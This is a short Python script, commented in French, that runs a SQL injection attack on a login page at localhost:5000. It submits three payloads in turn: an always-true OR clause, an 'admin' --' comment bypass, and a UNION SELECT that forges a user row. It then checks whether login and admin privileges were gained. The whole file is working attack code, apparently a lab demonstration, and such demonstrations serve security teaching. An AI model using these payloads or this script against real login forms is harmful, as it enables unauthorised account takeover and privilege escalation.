import requests
from bs4 import BeautifulSoup
import re

# URL de la page de connexion
LOGIN_URL = 'http://localhost:5000/login'

def perform_sql_injection():
    """Démonstration d'une attaque par injection SQL"""
    
    print("Attaque par injection SQL en cours...")
    
    # Charge une session pour maintenir les cookies
    session = requests.Session()
    
    # Récupère le formulaire de connexion pour obtenir le CSRF token si nécessaire
    response = session.get(LOGIN_URL)
    
    # Exemples de payloads d'injection SQL
    payloads = [
        # Contourner l'authentification
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        # Utilise un commentaire SQL pour ignorer le reste de la requête
        {"username": "admin' --", "password": "n'importe quoi"},
        # Utilise une requête UNION pour extraire des données supplémentaires
        {"username": "' UNION SELECT 1, 'admin', 'password', 'admin@example.com', 1 --", "password": "password"}
    ]
    
    # Test de chaque payload
    for i, payload in enumerate(payloads):
        print(f"\nTentative {i+1}: {payload}")
        
        # Envoie la requête avec le payload
        response = session.post(LOGIN_URL, data=payload)
        
        # Vérifie si la connexion a réussi
        if "Déconnexion" in response.text:
            print("SUCCÈS! Connexion réussie avec l'injection SQL.")
            
            # Détermine le nom d'utilisateur avec lequel on est connecté
            soup = BeautifulSoup(response.text, 'html.parser')
            username_match = re.search(r'Déconnexion \((.*?)\)', response.text)
            if username_match:
                username = username_match.group(1)
                print(f"Connecté en tant que: {username}")
            
            # Vérifie si on a des privilèges d'administrateur
            if "Administration" in response.text:
                print("Privilèges d'administrateur obtenus!")
            else:
                print("Pas de privilèges d'administrateur.")
                
            return True
        else:
            print("Échec de la tentative.")
    
    print("\nToutes les tentatives d'injection SQL ont échoué.")
    return False

if __name__ == "__main__":
    perform_sql_injection()